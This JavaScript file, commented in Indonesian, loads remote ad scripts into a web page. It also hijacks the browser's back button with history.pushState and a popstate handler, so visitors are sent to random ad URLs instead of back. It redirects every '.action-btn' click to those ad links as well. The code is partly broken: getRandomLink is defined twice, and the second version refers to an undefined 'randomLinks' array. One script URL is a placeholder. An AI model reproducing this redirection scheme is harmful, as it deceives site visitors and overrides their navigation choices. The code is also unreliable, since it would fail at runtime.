// Iklan Pertama - langsung diload
var s1 = document.createElement('script');
s1.src = "//filingattenuate.com/78/eb/56/78eb564356465edb57c47d3471c27669.js";
s1.type = "text/javascript";
document.body.appendChild(s1);

// Iklan Kedua - delay 5 detik
setTimeout(function () {
    var s2 = document.createElement('script');
    s2.src = "//filingattenuate.com/10/e8/1e/10e81ece8097c3d105ee9bb350dc132d.js";
    s2.type = "text/javascript";
    document.body.appendChild(s2);
}, 5000);

// Iklan Ketiga - delay 3 detik
setTimeout(function () {
    var s3 = document.createElement('script');
    s3.src = "//link-iklan-ke3.js";
    s3.type = "text/javascript";
    document.body.appendChild(s3);
}, 3000);

//iklan ketika kembali
// Daftar link tujuan
const redirectLinks = [
    "https://domesticrejoinedremark.com/rr7w4y66s?key=f5a3297e273e8f2b63d61b0d19b8d0a9",
    "https://domesticrejoinedremark.com/xsv7f4118a?key=a12a22c36e35a402ee435cfb6c6db695",
    "https://otieu.com/4/8420178"
];

// Fungsi ambil link acak
function getRandomLink() {
    const randomIndex = Math.floor(Math.random() * redirectLinks.length);
    return redirectLinks[randomIndex];
}

// Tambahkan state awal ke history
history.pushState(null, null, location.href);

// Dengarkan event saat tombol back ditekan
window.addEventListener('popstate', function (event) {
    const randomLink = getRandomLink();
    window.location.href = randomLink;
});

// script iklan ketika tombol action diklik
const adsbtnlink = [
    "https://domesticrejoinedremark.com/rr7w4y66s?key=f5a3297e273e8f2b63d61b0d19b8d0a9",
    "https://domesticrejoinedremark.com/xsv7f4118a?key=a12a22c36e35a402ee435cfb6c6db695",
    "https://otieu.com/4/8420178"
];
function getRandomLink() {
    const randomIndex = Math.floor(Math.random() * adsbtnlink.length);
    return randomLinks[randomIndex];
}

document.querySelectorAll(".action-btn").forEach(btn => {
    btn.addEventListener("click", () => {
        const randomUrl = getRandomLink();
        window.location.href = randomUrl; // arahkan ke link random
    });
});